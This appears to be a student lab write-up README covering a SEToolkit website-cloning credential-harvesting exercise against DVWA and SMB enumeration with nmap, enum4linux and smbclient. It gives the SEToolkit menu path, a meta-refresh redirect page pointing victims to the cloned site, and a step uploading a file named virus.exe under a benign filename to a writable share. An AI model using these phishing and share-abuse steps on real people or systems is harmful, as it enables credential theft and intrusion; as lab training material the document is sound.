# Setoolkit-Smb-enumeration-lab
Documentation of controlled ethical hacking labs demonstrating website cloning attacks and SMB enumeration techniques using Kali Linux tools.
# SEToolkit – smbclient – Enum4Linux Lab Documentation

This repository contains documentation for ethical hacking labs performed in a controlled and authorized lab environment for educational purposes only.



Labs Included
1. Website Cloning using SEToolkit
2. SMB Vulnerability Scanning using Enum4Linux and smbclient

Each lab includes:
- Step-by-step procedure
- Commands used
- Screenshots
- Observations and findings

⚠ Disclaimer:
All activities were conducted in a lab environment with permission. These techniques must not be used on real systems without authorization.


LAB 1: WEBSITE CLONING USING SETOOLKIT


Objective
To understand how website cloning and credential harvesting work and how phishing attacks can trick users into submitting login details.


Tools Used
- Kali Linux
- SEToolkit


Lab Setup
- Attacker Machine: Kali Linux
- Target Website: DVWA (Lab VM)
- Attacker IP Address: 10.6.6.1


Step 1: Launch SEToolkit

sudo su
setoolkit


Step 2: Select Attack Method

Inside SEToolkit, the following options were selected:

1  → Social-Engineering Attacks
2  → Website Attack Vectors
3  → Credential Harvester Attack Method
2  → Site Cloner


Step 3: Configure Website Cloning

Attacker IP Address:
10.6.6.1

Website to clone:
http://dvwa.vm

SEToolkit clones the website and hosts it on the attacker machine.


Step 4: Create Redirect HTML File

A redirect HTML file was created to automatically send users to the cloned website.

<html>
<head>
<meta http-equiv="refresh" content="0; url=http://10.6.6.1/" />
</head>
</html>

Steps:
1. Open a text editor
2. Paste the code above
3. Save as ladies.html on the Desktop
4. Open the file in a browser


Step 5: Credential Capture Test

Test credentials used:
Email: ladies@gmail.com
Password: 1234

These credentials were dummy data used for demonstration purposes only.


Step 6: Stop the Attack and Exit

Ctrl + C
99
99
99
99


Step 7: View Captured Report

cat /root/.set/reports/"2025-12-14 13:34:09.326665.xml"


Findings
1. The cloned website appeared identical to the original.
2. Login credentials were successfully captured.
3. This demonstrates how phishing attacks deceive users.


Key Takeaways
1. Website cloning is a common phishing technique.
2. Users must verify URLs carefully.
3. Security awareness helps prevent phishing attacks.


LAB 2: SMB VULNERABILITY SCANNING USING ENUM4LINUX


Objective
To identify SMB misconfigurations by enumerating users, shares, and permissions on a target system.


Tools Used
- Nmap
- Enum4Linux
- smbclient


Lab Setup
- Attacker Machine: Kali Linux
- Target IP Address: 172.17.0.2


Step 1: Network Discovery

nmap -sN 172.17.0.0/24


Step 2: SMB Enumeration Using Enum4Linux

enum4linux -U 172.17.0.2
enum4linux -n 172.17.0.2
enum4linux -o 172.17.0.2
enum4linux -S 172.17.0.2
enum4linux -Sv 172.17.0.2
enum4linux -P 172.17.0.2
enum4linux -a 172.17.0.2


Step 3: SMB Share Access Using smbclient

List available shares:
smbclient -L //172.17.0.2/

Access temporary share:
smbclient //172.17.0.2/tmp


Step 4: File Upload Test (Lab Simulation)

nano virus.exe

Upload the file to the SMB share:
put virus.exe group_work.txt

⚠ The file was not malicious and was used strictly for educational testing.


Findings
1. SMB shares were accessible with weak restrictions.
2. Enumeration revealed useful system information.
3. Writable shares increase security risk.


Key Takeaways
1. SMB services must be properly secured.
2. Enumeration is a critical phase in penetration testing.
3. Least-privilege access reduces security risks.


CONCLUSION


These labs provided hands-on exposure to social engineering and network service enumeration techniques. They emphasized the importance of user awareness, proper system configuration, and ethical responsibility when using offensive security tools.

All activities were conducted strictly in a controlled lab environment for educational purposes only.
